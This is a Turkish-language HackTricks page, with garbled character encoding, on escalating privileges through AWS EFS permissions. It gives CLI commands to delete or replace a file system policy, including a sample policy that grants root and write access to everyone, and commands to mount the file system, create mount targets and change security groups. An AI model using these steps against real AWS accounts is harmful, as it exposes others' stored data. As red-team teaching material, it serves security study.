# AWS - EFS Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## EFS

EFS hakkÄ±nda daha fazla **bilgi** iÃ§in:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Bir EFS'i baÄŸlamak iÃ§in, EFS'in aÃ§Ä±ÄŸa Ã§Ä±karÄ±ldÄ±ÄŸÄ± bir alt aÄŸda olmanÄ±z ve eriÅŸiminizin olmasÄ± (gÃ¼venlik gruplarÄ±) gerektiÄŸini unutmayÄ±n. Bu durum gerÃ§ekleÅŸiyorsa, varsayÄ±lan olarak her zaman baÄŸlantÄ± yapabilirsiniz, ancak IAM politikalarÄ±yla korunuyorsa, eriÅŸim iÃ§in burada belirtilen ek izinlere sahip olmanÄ±z gerekmektedir.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Bu izinlerden herhangi biriyle bir saldÄ±rgan, **dosya sistemi politikasÄ±nÄ± deÄŸiÅŸtirerek** size eriÅŸim saÄŸlayabilir veya sadece **silmek** iÃ§in varsayÄ±lan eriÅŸimi saÄŸlayabilir.

PolitikayÄ± silmek iÃ§in:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
DeÄŸiÅŸtirmek iÃ§in:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Bu izinle bir saldÄ±rgan, EFS'yi **baÄŸlama** yeteneÄŸine sahip olacaktÄ±r. EFS'yi baÄŸlayabilen herkese yazma izni verilmediyse, sadece **okuma eriÅŸimi** olacaktÄ±r.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Ekstra izinler `elasticfilesystem:ClientRootAccess` ve `elasticfilesystem:ClientWrite`, dosya sistemi baÄŸlandÄ±ktan sonra iÃ§ine **yazmak** ve bu dosya sistemine **root olarak eriÅŸmek** iÃ§in kullanÄ±labilir.

**Potansiyel Etki:** Dosya sisteminde hassas bilgileri bulmak suretiyle dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme.

### `elasticfilesystem:CreateMountTarget`

EÄŸer bir saldÄ±rgan, EFS'nin **hiÃ§bir baÄŸlama hedefinin** bulunmadÄ±ÄŸÄ± bir **alt aÄŸda** bulunuyorsa, bu ayrÄ±calÄ±kla sadece **kendi alt aÄŸÄ±na bir baÄŸlama hedefi oluÅŸturabilir**:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potansiyel Etki:** Dosya sisteminde hassas bilgileri bulmak suretiyle dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

Bir saldÄ±rgan, EFS'nin alt aÄŸÄ±nda bir baÄŸlama hedefi olduÄŸunu fark eder ancak **hiÃ§bir gÃ¼venlik grubu trafiÄŸe izin vermiyorsa**, sadece **seÃ§ilen gÃ¼venlik gruplarÄ±nÄ± deÄŸiÅŸtirerek** bunu deÄŸiÅŸtirebilir:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potansiyel Etki:** Dosya sisteminde hassas bilgileri bulma yoluyla dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
